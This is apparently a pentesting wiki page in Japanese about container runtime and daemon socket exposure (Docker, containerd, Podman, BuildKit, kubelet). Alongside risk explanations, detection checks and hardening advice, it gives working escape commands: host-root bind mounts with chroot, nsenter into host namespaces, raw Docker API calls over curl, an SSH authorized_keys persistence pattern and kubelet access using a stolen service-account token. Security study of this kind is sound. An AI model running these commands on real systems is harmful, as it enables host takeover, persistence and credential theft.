# Runtime API And Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Overview

実際の container 侵害の多くは、namespace escape から始まるわけではありません。runtime control plane へのアクセスから始まります。workload が、マウントされた Unix socket や公開された TCP listener を介して `dockerd`、`containerd`、CRI-O、Podman、kubelet と通信できる場合、attacker はより高い権限を持つ新しい container の作成、host filesystem の mount、host namespace への参加、機密性の高い node 情報の取得を要求できる可能性があります。このような場合、runtime API が実際の security boundary であり、これを compromise することは実質的に host を compromise することに近い状態です。

このため、runtime socket の exposure は kernel protection とは別に記録すべきです。通常の seccomp、capabilities、MAC confinement が適用された container であっても、`/var/run/docker.sock` や `/run/containerd/containerd.sock` が内部に mount されていれば、host compromise まで API call 一回で到達できる可能性があります。現在の container に対する kernel isolation が設計どおり機能していても、runtime management plane は完全に露出したままになり得ます。

## Daemon Access Models

Docker Engine は従来、privileged API をローカル Unix socket `unix:///var/run/docker.sock` 経由で公開しています。これまで、`tcp://0.0.0.0:2375` のような TCP listener や、TLS で保護された `2376` の listener を介して remote に公開されることもありました。強力な TLS と client authentication なしで daemon を remote に公開すると、実質的に Docker API が remote root interface になります。

containerd、CRI-O、Podman、kubelet も、同様に影響の大きい attack surface を公開します。名称や workflow は異なりますが、logic は変わりません。interface により caller が workload の作成、host path の mount、credentials の取得、実行中の container の変更を行える場合、その interface は privileged management channel であり、それに応じて扱うべきです。

確認すべき一般的なローカル path は次のとおりです。
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
古い、またはより特殊な stack では、`dockershim.sock`、`frakti.sock`、`rktlet.sock` などの endpoint が公開されている場合もあります。これらは現代の環境ではあまり一般的ではありませんが、見つかった場合は、通常の application socket ではなく runtime-control surface を表すため、同じように慎重に扱う必要があります。

## Secure Remote Access

daemon を local socket の外部に公開する必要がある場合、接続は TLS で保護し、可能であれば mutual authentication を使用して、daemon が client を検証し、client が daemon を検証できるようにすべきです。利便性のために Docker daemon を plain HTTP で公開する古い習慣は、container administration における最も危険なミスの一つです。API surface は、privileged container を直接作成できるほど強力だからです。

Historical な Docker configuration pattern は次のようなものでした。
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
systemdベースのホストでは、daemonとの通信が`fd://`として現れることもあります。これは、プロセス自身が直接bindするのではなく、systemdから事前にopenされたsocketを継承することを意味します。重要なのは正確なsyntaxではなく、security上の影響です。daemonが厳格にpermission設定されたlocal socketの範囲を超えてlistenした時点で、transport securityとclient authenticationは任意のhardeningではなく、必須になります。

## Abuse

runtime socketが存在する場合は、それがどのsocketなのか、compatibleなclientが存在するか、raw HTTPまたはgRPC accessが可能かを確認します：
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
これらのコマンドが有用なのは、到達不能なパス、マウントされているがアクセスできないソケット、そして稼働中の特権 API を区別できるためです。client が成功した場合、次に確認すべきなのは、API を使って host bind mount または host namespace sharing を指定した新しい container を起動できるかどうかです。

### Client がインストールされていない場合

`docker`、`podman`、その他の使いやすい CLI が存在しないからといって、socket が安全だとは限りません。Docker Engine は Unix socket 上で HTTP を使用し、Podman は `podman system service` を通じて Docker-compatible API と Libpod-native API の両方を公開します。つまり、`curl` しかない最小限の環境でも daemon を操作できる可能性があります。
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
これは post-exploitation の際に重要です。defender が通常の client binaries を削除していても、management socket が mount されたままになっていることがあるためです。Podman hosts では、rootful と rootless の deployment で高価値な path が異なる点に注意してください。rootful service instances では `unix:///run/podman/podman.sock`、rootless では `unix://$XDG_RUNTIME_DIR/podman/podman.sock` です。

### Full Example: Docker Socket To Host Root

`docker.sock` に到達できる場合、古典的な escape は、host の root filesystem を mount した新しい container を起動し、そこに `chroot` する方法です：
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
これは Docker daemon を介した、host-root での直接実行を可能にします。影響はファイルの読み取りに限定されません。新しい container 内に侵入すると、攻撃者は host のファイルを改変し、credential を収集し、persistence を埋め込み、追加の privileged workload を起動できます。

### Full Example: Docker Socket To Host Namespaces

攻撃者が filesystem-only access ではなく namespace entry を選ぶ場合:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
この経路では、現在の container を exploit するのではなく、runtime に対して host namespace を明示的に公開した新しい container の作成を要求することで、host に到達します。

### Docker Socket Persistence Pattern

Runtime の control は、一度限りの shell ではなく persistence にも利用できます。一般的なパターンは、host mount を持つ helper container を作成し、mount された host filesystem に authorized access material または startup hook を書き込み、その後 host がそれを取り込むことを確認するというものです。

Example shape:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
同じ考え方で、operator が何を証明したいかに応じて、systemd units、cron fragments、application startup files、または SSH keys を対象にできます。重要なのは、persistent change が original container 内の追加の privilege によってではなく、runtime daemon が持つ host-level filesystem authority を通じて行われる点です。

### Raw Docker API Helper Pivot

Docker CLI がない場合でも、同じ host-mount helper flow を Unix socket 経由の HTTP で実行できます。generic flow は、API を確認し、host bind mount を持つ helper container を作成し、それを起動し、exec instance を作成して、その exec を起動することです。
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
最終的な `/exec/<id>/start` request は返された exec ID に依存しますが、security 上の要点は正確な JSON plumbing とは無関係です。rootful Docker daemon への raw API access だけで、より強力な helper workload を request するには十分です。

### Full Example: containerd Socket

マウントされた `containerd` socket も、通常は同様に危険です。
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
より Docker に近い client が存在する場合、`nerdctl` は `ctr` より便利です。`--privileged`、`--pid=host`、`-v` などの使い慣れた flags が利用できるためです：
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
影響はやはりホスト侵害です。Docker固有の tooling が存在しない場合でも、別の runtime API が同じ管理権限を提供している可能性があります。Kubernetes nodes では、`crictl` が CRI endpoint と直接通信するため、偵察や container との interaction に十分な場合もあります。

### BuildKit Socket

`buildkitd` は「単なる build backend」と考えられがちなため見落とされやすいものの、daemon は依然として privileged control plane です。アクセス可能な `buildkitd.sock` によって、attacker は arbitrary build steps の実行、worker capabilities の調査、compromised environment の local contexts の使用、さらに daemon が許可するよう設定されている場合には `network.host` や `security.insecure` などの危険な entitlements の要求が可能になります。

最初に行う有用な interactions は次のとおりです。
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
daemon が build request を受け付ける場合、insecure entitlements が利用可能かテストします：
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
影響の詳細は daemon の設定に依存しますが、permissive な entitlements を持つ rootful BuildKit service は、無害な開発者向けの利便性機能ではありません。特に CI runners や共有 build nodes では、別の高価値な管理用 surface として扱ってください。

### TCP 経由の Kubelet API

kubelet は container runtime ではありませんが、依然として node management plane の一部であり、同じ trust boundary の議論に含まれることがよくあります。kubelet の secure port `10250` に workload から到達可能な場合、または node credentials、kubeconfigs、proxy rights が露出している場合、攻撃者は Kubernetes API server の admission path に一切触れることなく、Pods を列挙したり、logs を取得したり、node-local containers 内で commands を実行したりできる可能性があります。

まずは低コストの discovery から始めます：
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
kubelet または API-server proxy path が `exec` を認可している場合、WebSocket-capable client によって、それを利用して node 上の他の container で code execution を実行できます。これが、`get` permission のみを持つ `nodes/proxy` が見た目以上に危険な理由でもあります。リクエストは command を実行する kubelet endpoints に到達でき、こうした kubelet への直接 interaction は通常の Kubernetes audit logs には記録されません。

## チェック

これらのチェックの目的は、container が trust boundary の外部に留めるべき management plane に到達できるかどうかを確認することです。
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
ここで重要な点:

- マウントされた runtime socket は、単なる情報漏えいではなく、通常は直接的な管理操作の手段です。
- TLS なしで `2375` をリッスンしている TCP listener は、remote compromise 状態として扱う必要があります。
- `DOCKER_HOST` などの環境変数は、workload が意図的にホストの runtime と通信するよう設計されたことを示す場合があります。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | デフォルトではローカル Unix socket | `dockerd` はローカル socket で listen し、daemon は通常 rootful | `/var/run/docker.sock` のマウント、`tcp://...:2375` の公開、`2376` の TLS が弱い、または存在しない |
| Podman | デフォルトでは daemonless CLI | 通常のローカル利用では、長時間稼働する privileged daemon は不要。ただし `podman system service` が有効な場合、API socket が公開されることがある | `podman.sock` の公開、service の広範な実行、rootful API の利用 |
| containerd | ローカルの privileged socket | Administrative API はローカル socket 経由で公開され、通常は上位の tooling が利用する | `containerd.sock` のマウント、広範な `ctr` または `nerdctl` access、privileged namespace の公開 |
| CRI-O | ローカルの privileged socket | CRI endpoint は node-local の trusted component 向け | `crio.sock` のマウント、CRI endpoint の untrusted workload への公開 |
| Kubernetes kubelet | Node-local management API | Kubelet は Pods から広範囲に到達可能であってはならない。認証・認可の設定によっては、access により pod state、credentials、execution features が公開される可能性がある | kubelet socket または cert のマウント、kubelet auth の弱さ、host networking と到達可能な kubelet endpoint の組み合わせ |

## References

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
